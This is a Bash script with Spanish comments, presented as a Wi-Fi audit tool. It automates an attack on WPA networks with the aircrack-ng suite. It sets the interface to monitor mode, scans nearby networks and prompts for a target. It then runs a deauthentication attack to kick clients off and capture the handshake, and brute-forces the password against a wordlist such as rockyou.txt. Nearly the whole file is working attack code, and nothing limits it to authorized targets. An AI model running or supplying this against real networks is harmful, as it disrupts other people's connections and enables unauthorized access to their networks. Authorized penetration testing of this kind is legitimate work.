#!/bin/bash

# Script de automatización para auditoría Wi-Fi
# Requiere: aircrack-ng suite y permisos de root

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Función para mostrar mensajes
print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Verificar si se ejecuta como root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "Este script debe ejecutarse como root"
        exit 1
    fi
}

# Verificar dependencias
check_dependencies() {
    local deps=("aircrack-ng" "iwconfig" "ifconfig")
    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            print_error "Falta la dependencia: $dep"
            exit 1
        fi
    done
    print_success "Todas las dependencias están instaladas"
}

# Configurar interfaz en modo monitor
setup_monitor_mode() {
    local interface=$1
    
    print_status "Configurando $interface en modo monitor..."
    
    # Detener servicios que puedan interferir
    service NetworkManager stop 2>/dev/null
    service wpa_supplicant stop 2>/dev/null
    
    # Poner interfaz en modo monitor
    ifconfig $interface down
    iwconfig $interface mode monitor
    ifconfig $interface up
    
    # Verificar que está en modo monitor
    local mode=$(iwconfig $interface 2>/dev/null | grep -o "Mode:Monitor")
    if [[ $mode == "Mode:Monitor" ]]; then
        print_success "$interface configurada en modo monitor"
    else
        print_error "No se pudo poner $interface en modo monitor"
        exit 1
    fi
}

# Escanear redes disponibles
scan_networks() {
    local interface=$1
    local scan_time=$2
    
    print_status "Escaneando redes durante ${scan_time} segundos..."
    airodump-ng $interface --output-format csv -w scan_output --write-interval 1 &> /dev/null &
    local scan_pid=$!
    
    sleep $scan_time
    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null
    
    # Mostrar redes encontradas
    if [[ -f "scan_output-01.csv" ]]; then
        print_success "Redes encontradas:"
        echo "=========================================="
        grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' scan_output-01.csv | while IFS=, read -r bssid first last channel speed privacy cipher auth power beacons iv lan ip id essid; do
            if [[ ! -z "$essid" ]]; then
                echo "ESSID: $essid"
                echo "BSSID: $bssid"
                echo "Canal: $channel"
                echo "Potencia: $power"
                echo "------------------------------------------"
            fi
        done
    else
        print_error "No se pudieron escanear redes"
        exit 1
    fi
}

# Capturar handshake
capture_handshake() {
    local interface=$1
    local bssid=$2
    local channel=$3
    local output_file=$4
    
    print_status "Iniciando captura de handshake..."
    print_status "BSSID: $bssid"
    print_status "Canal: $channel"
    print_status "Archivo: $output_file"
    
    # Iniciar captura en segundo plano
    airodump-ng --bssid $bssid --channel $channel --write $output_file $interface &
    local capture_pid=$!
    
    print_warning "Mantén esta terminal abierta"
    print_status "En 10 segundos se ejecutará el ataque de deautenticación..."
    sleep 10
    
    # Ejecutar ataque de deautenticación
    print_status "Ejecutando ataque de deautenticación..."
    aireplay-ng --deauth 20 -a $bssid $interface &
    local deauth_pid=$!
    
    sleep 5
    kill $deauth_pid 2>/dev/null
    
    # Esperar a que capture el handshake
    print_status "Esperando handshake... (Ctrl+C para detener)"
    
    # Verificar periódicamente si se capturó el handshake
    while true; do
        if aircrack-ng ${output_file}-01.cap 2>/dev/null | grep -q "Handshake"; then
            print_success "¡Handshake capturado!"
            kill $capture_pid 2>/dev/null
            break
        fi
        sleep 5
    done
    
    wait $capture_pid 2>/dev/null
}

# Crackear handshake
crack_handshake() {
    local handshake_file=$1
    local wordlist=$2
    
    if [[ ! -f "$handshake_file" ]]; then
        print_error "Archivo de handshake no encontrado: $handshake_file"
        return 1
    fi
    
    if [[ ! -f "$wordlist" ]]; then
        print_warning "Wordlist no encontrada, usando lista por defecto"
        wordlist="/usr/share/wordlists/rockyou.txt"
        if [[ ! -f "$wordlist" ]]; then
            print_error "Wordlist por defecto no encontrada"
            return 1
        fi
    fi
    
    print_status "Iniciando ataque de fuerza bruta..."
    print_status "Handshake: $handshake_file"
    print_status "Wordlist: $wordlist"
    
    aircrack-ng $handshake_file -w $wordlist
}

# Limpiar archivos temporales
cleanup() {
    print_status "Limpiando archivos temporales..."
    rm -f scan_output-* *.csv *.cap *.kismet.* *.netxml 2>/dev/null
}

# Función principal
main() {
    clear
    echo "=========================================="
    echo "    Script de Auditoría Wi-Fi"
    echo "=========================================="
    
    check_root
    check_dependencies
    
    local interface="wlan0"
    local scan_time=10
    local output_file="handshake_capture"
    
    # Configurar interfaz
    setup_monitor_mode $interface
    
    # Escanear redes
    scan_networks $interface $scan_time
    
    # Solicitar datos de la red objetivo
    echo
    print_warning "Introduce los datos de la red objetivo:"
    read -p "BSSID: " target_bssid
    read -p "Canal: " target_channel
    read -p "ESSID (opcional): " target_essid
    
    # Capturar handshake
    capture_handshake $interface $target_bssid $target_channel $output_file
    
    # Preguntar si quiere crackear el handshake
    echo
    read -p "¿Quieres intentar crackear el handshake ahora? (s/n): " crack_choice
    
    if [[ $crack_choice == "s" || $crack_choice == "S" ]]; then
        read -p "Ruta del wordlist (dejar vacío para usar por defecto): " wordlist_path
        crack_handshake "${output_file}-01.cap" "$wordlist_path"
    else
        print_status "Handshake guardado en: ${output_file}-01.cap"
        print_status "Puedes crackearlo después con:"
        echo "aircrack-ng ${output_file}-01.cap -w <wordlist>"
    fi
    
    # Limpiar
    cleanup
    
    # Restaurar servicios
    service NetworkManager start 2>/dev/null
    service wpa_supplicant start 2>/dev/null
    
    print_success "Proceso completado"
}

# Manejar señal de interrupción
trap 'print_warning "Interrumpido por el usuario"; cleanup; exit 1' INT TERM

# Ejecutar función principal
main
